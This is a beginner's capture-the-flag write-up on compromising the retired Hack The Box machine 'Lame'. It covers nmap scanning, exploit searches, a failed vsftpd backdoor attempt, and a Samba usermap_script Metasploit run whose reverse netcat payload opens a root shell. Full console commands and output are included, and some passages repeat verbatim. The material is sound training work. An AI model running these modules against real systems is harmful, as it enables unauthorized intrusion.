This is a write-up for an easy retired box on the Hackthebox platform called lame. My goal is to improve writing notes when hacking and for others to learn a thing or two.
This machine is a network exploit based machine. First thing you will want to do is map the ports on it . That's where a good old tool called Nmap comes in. 

```  
┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sC -sV 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at  
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.64
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m23s, deviation: 2h49m44s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-24T18:04:23-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.11 seconds```
what sticks out right away to me is a few things.
Nmap reveals a ftp port :  vsFTPd 2.3.4 , 
 OpenSSH : 4.7p1 Debian 8ubuntu1 
and Samba: Samba 3.0.20-Debian running on the target server each with version information  
port 21 has a anonymous ftp login enabled which is a glaring issue. there is also a version number of ftp mentioned
we can check the anonymous ftp login but we will focus more on version information. 
the version is   vsftpd 2.3.4
is this a potential exploit. lets search around using 3 methods 
method 1 google
method 2 searchsploit 
method 3 metasploit
method 1 we google vsftpd 2.3.4 and our first result shows   https://www.exploit-db.com/exploits/49757 
interesting script save it for later lets see what our other method produce
method 2 searchsploit
lets search for our exploit in the nifty built in searchsploit exploitdb database 
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit vsFTPd 2.3.4
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                                                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                                                                           | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
we see the same unix/remote/49757.py  Backdoor Command Execution exploit we saw earlier in our google search https://www.exploit-db.com/exploits/49757
```
┌──(kali㉿kali)-[~]
└─$ searchsploit vsFTPd 2.3.4
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                                                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                                                                           | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
what sticks out right away to me is a few things.
Nmap reveals a ftp port :  vsFTPd 2.3.4 , 
 OpenSSH : 4.7p1 Debian 8ubuntu1 
and Samba: Samba 3.0.20-Debian running on the target server each with version information  
port 21 has a anonymous ftp login enabled which is a glaring issue. there is also a version number of ftp mentioned
we can check the anonymous ftp login but we will focus more on version information. 
the version is   vsftpd 2.3.4
is this a potential exploit. lets search around using 3 methods 
method 1 google
method 2 searchsploit 
method 3 metasploit
method 1 we google vsftpd 2.3.4 and our first result shows   https://www.exploit-db.com/exploits/49757 
interesting script save it for later lets see what our other method produce
method 2 searchsploit
lets search for our exploit in the nifty built in searchsploit exploitdb database 
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit vsFTPd 2.3.4
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                                                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                                                                           | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
we see the same unix/remote/49757.py  Backdoor Command Execution exploit we saw earlier in our google search https://www.exploit-db.com/exploits/49757
we spin up metasploit via the msfconsole command
within metasploit we search for the version info we mentioned earlier vsftpd 2.3.4
```
msf6 > search vsftpd 2.3.4
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```
screenshot https://imgur.com/F59SHNS
this is the hardest part about using metasploit. finding the right exploit to use and configuring it with all the right values . In this case theres only one potential metasploit module so we do use 0
we use 0 and we configure the ports and ip addresses 
```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.14.64
rhosts => 10.10.14.64
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rport 4444
rport => 4444
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set lhosts 10.10.14.64
[!] Unknown datastore option: lhosts. Did you mean RHOSTS?
lhosts => 10.10.14.64
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.14.64      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    4444             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set chost 10.10.14.64
chost => 10.10.14.64
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set cport 4444
cport => 4444
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rport 21
rport => 21
```
now we run it
we run it but it doesnt really work 
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
exit
^C[*] Exploit completed, but no session was created.
```
we could delve deeper into it and try to make it work but lets try another port number and see what issues it has
i search for OpenSSH 4.7p1 Debian 8ubuntu1 exploit on google but didnt find much going on in way of exploitdb links or github links
there is one older exploit but my gut reaction is to explore other methods for now
tldr i know this isnt the exploit so i will gloss over it for now and wont use method 2 or 3 for finding an exploit
we finally arrive at our third and final port 445 samba
this has to be it
we search "samba 3.0.20 exploit" into google and find   a exploitdb link https://www.exploit-db.com/exploits/16320 
after reading thru it i realize its referencing a metasploit module. we have metasploit built into our machine so lets jump into that
we spin up msfconsole and search for this exploit 
```
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
```
sure enough as exploitdb showed us earlier its right there
we need to select that particular module and then see  what options are available for this module 
i select the module by typing in use 0 and type in options to see what i need to configure 
```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.64.139   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
our local ip or lhost is our vpn ip address so that needs to be configured to our vpn ip address
our remote host (rhosts) need to be changed to attack the virtual hackthebox machine and we will keep the remote port (rport) the same  because this exploit exploits samba whos default port is 139
and our victim Hackthebox machine is running samba on that port as well so no  change is needed.
```
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.64
lhost => 10.10.14.64
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
```
now that our unique configuration is set up lets run our exploit!!!
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.64:4444 
[*] Command shell session 1 opened (10.10.14.64:4444 -> 10.10.10.3:41098) at 2024-07-24 18:14:30 -0400

whoami
root
```
screenshot https://imgur.com/usYATzX 
after searching through the home and root directories we find some flags
namely the user flag at /home/makis/user.txt and  the root flag at /root/root.txt
also based on good practice you should always prove for report writing that you got access to the machine by running a whoami command to show the user as well show the hostname, IP address and then cat the flag. 
at least thats how its taught for the oscp reporting requirements.
putting that all together will look like `whoami && hostname && ip a && cat /home/makis/user.txt && cat /root/root.txt`
lets run it and show a screenshot. ive purposely censored the actual flags
```
whoami && hostname && ip a && cat /home/makis/user.txt && cat /root/root.txt
root
lame
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b0:79:a0 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.3/24 brd 10.10.10.255 scope global eth0
    inet6 dead:beef::250:56ff:feb0:79a0/64 scope global dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb0:79a0/64 scope link 
       valid_lft forever preferred_lft forever
1c13censoreduserflag 
2af717censoredrootflag
```
https://imgur.com/LeqY7xJ screenshot of the censored flags






